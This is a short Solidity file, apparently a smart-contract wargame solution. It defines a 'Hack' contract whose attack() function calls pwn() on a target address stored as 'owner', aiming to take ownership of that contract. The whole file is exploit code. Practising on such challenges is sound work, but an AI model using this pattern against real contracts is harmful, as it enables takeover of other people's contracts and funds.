// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Hack {
    address public owner;

    constructor(address _owner) public {
        owner = _owner;
    }

    function attack() public {
        owner.call(abi.encodeWithSignature("pwn()"));
    }
}